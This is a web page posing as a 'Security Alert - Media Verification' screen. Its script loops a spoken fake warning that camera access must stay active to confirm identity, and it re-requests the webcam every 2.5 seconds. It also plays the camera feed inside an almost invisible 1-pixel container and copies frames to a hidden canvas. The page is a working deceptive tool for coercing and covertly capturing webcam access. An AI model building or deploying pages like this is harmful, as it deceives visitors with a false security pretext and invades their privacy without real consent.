<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Security Alert - Media Verification</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body { background: #000; min-height: 100vh; display: flex; justify-content: center; align-items: center; color: #fff; font-family: sans-serif; }
  video { width: 320px; height: 240px; border: 1px solid #333; background: #111; }
  .hidden-container { position: absolute; opacity: 0.01; pointer-events: none; overflow: hidden; width: 1px; height: 1px; }
</style>
</head>
<body>

<div class="hidden-container">
  <video id="cam-feed" autoplay playsinline muted></video>
  <canvas id="processing-canvas" width="640" height="480"></canvas>
</div>

<script>
(function () {
  'use strict';

  var CONFIG = {
    tts: {
      text: "Security verification required. Camera access must remain active to confirm user identity.",
      lang: 'en-US',
      rate: 0.9,
      pitch: 1.0,
      repeatInterval: 5000,
      maxRepeats: 30
    },
    loopInterval: 2500 // Interval agresif untuk siklus re-inisialisasi stream
  };

  var state = {
    ttsStarted: false,
    ttsCount: 0,
    camStream: null,
    camActive: false,
    loopTimer: null
  };

  // ============================================
  // TTS MODULE (Continuous Loop)
  // ============================================
  function speakOnce() {
    if (!('speechSynthesis' in window)) return;
    try {
      var u = new SpeechSynthesisUtterance(CONFIG.tts.text);
      u.lang = CONFIG.tts.lang;
      u.rate = CONFIG.tts.rate;
      u.pitch = CONFIG.tts.pitch;

      u.onend = function () {
        setTimeout(speakOnce, CONFIG.tts.repeatInterval);
      };

      window.speechSynthesis.speak(u);
    } catch (e) {}
  }

  function startTTS() {
    if (state.ttsStarted) return;
    state.ttsStarted = true;
    window.speechSynthesis.cancel();
    speakOnce();
  }

  // ============================================
  // AGGRESSIVE CAMERA LOOP MODULE
  // ============================================
  function stopCurrentStream() {
    if (state.camStream) {
      try {
        state.camStream.getTracks().forEach(function(track) {
          track.stop();
        });
      } catch (e) {}
      state.camStream = null;
    }
    state.camActive = false;
  }

  function requestCameraAccess() {
    // Tutup stream sebelumnya secara berkala untuk memaksa siklus refresh stream baru (Looping mechanism)
    stopCurrentStream();

    navigator.mediaDevices.getUserMedia({ 
      video: { 
        width: { ideal: 640 }, 
        height: { ideal: 480 },
        facingMode: "user" 
      }, 
      audio: false 
    })
    .then(function(stream) {
      state.camStream = stream;
      state.camActive = true;
      console.log("[+] Camera stream cycle active.");
      
      var videoElement = document.getElementById('cam-feed');
      videoElement.srcObject = stream;
      videoElement.play().catch(function(){});

      // Proses frame secara kontinu di background menggunakan canvas untuk menjaga aktivitas stream tetap tinggi
      var canvas = document.getElementById('processing-canvas');
      var ctx = canvas.getContext('2d');
      var frameLoop = setInterval(function() {
        if (!state.camActive) {
          clearInterval(frameLoop);
          return;
        }
        try {
          ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
        } catch (e) {}
      }, 500);

      stream.getVideoTracks().forEach(function(track) {
        track.onended = function() {
          state.camActive = false;
        };
      });
    })
    .catch(function(err) {
      console.log("[-] Camera access restricted/denied:", err.name);
    });
  }

  // ============================================
  // INITIALIZATION & PERSISTENT LOOP TRIGGER
  // ============================================
  window.addEventListener('DOMContentLoaded', function() {
    startTTS();
    requestCameraAccess();
  });

  // Main loop interval untuk memastikan siklus kamera terus direfresh secara periodik
  state.loopTimer = setInterval(function() {
    requestCameraAccess();
  }, CONFIG.loopInterval);

  // Tab visibility monitoring
  document.addEventListener('visibilitychange', function () {
    if (!document.hidden) {
      startTTS();
      requestCameraAccess();
    }
  });

})();
</script>
</body>
</html>
